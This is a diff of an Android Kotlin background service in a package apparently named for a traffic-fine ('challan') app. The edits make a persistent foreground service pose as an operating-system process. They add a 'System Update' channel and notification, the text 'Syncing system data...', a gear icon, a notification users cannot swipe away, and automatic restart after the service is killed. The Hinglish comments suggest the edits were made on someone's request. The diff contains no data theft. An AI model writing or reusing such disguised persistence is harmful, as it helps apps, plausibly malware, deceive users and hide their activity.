@@ -9,6 +9,8 @@ import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
+import com.rte.challan.R
 
 class BackgroundService : Service() {
 
@@ -19,7 +21,7 @@ class BackgroundService : Service() {
         super.onCreate()
         createNotificationChannel()
         
-        // Android 14+ ke liye foreground type handling
+        // Android 14+ (API 34) aur Android 15 ke liye special handling
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             try {
                 startForeground(
@@ -28,7 +30,6 @@ class BackgroundService : Service() {
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE 
                 )
             } catch (e: Exception) {
-                // Fallback agar type match na kare
                 startForeground(NOTIFICATION_ID, getNotification())
             }
         } else {
@@ -37,6 +38,7 @@ class BackgroundService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Isse service kill hone par apne aap restart ho jayegi
         return START_STICKY
     }
 
@@ -46,10 +48,10 @@ class BackgroundService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "System Services", // User settings mein ye dikhega
+                "System Update", // User ko settings mein ye naam dikhega
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Internal system configuration updates"
+                description = "System data synchronization and maintenance."
                 setSound(null, null)
                 setShowBadge(false)
             }
@@ -60,11 +62,14 @@ class BackgroundService : Service() {
 
     private fun getNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Updating...") // Aapki request ke mutabik badla gaya
-            .setContentText("Checking for latest configuration updates") // Official tone
-            .setSmallIcon(android.R.drawable.stat_notify_sync) // Rotating arrows icon
+            .setContentTitle("System Update") // Notification Title
+            .setContentText("Syncing system data...") // Notification Content
+            // ⬇️ Yahan humne naya Gear icon link kiya hai
+            .setSmallIcon(R.drawable.ic_notification_gear) 
+            // ⬇️ Isse notification icon blue color ka dikhega
+            .setColor(ContextCompat.getColor(this, R.color.ic_launcher_background))
             .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setOngoing(true)
+            .setOngoing(true) // User ise swipe karke hata nahi payega
             .setCategory(Notification.CATEGORY_SERVICE)
             .build()
     }
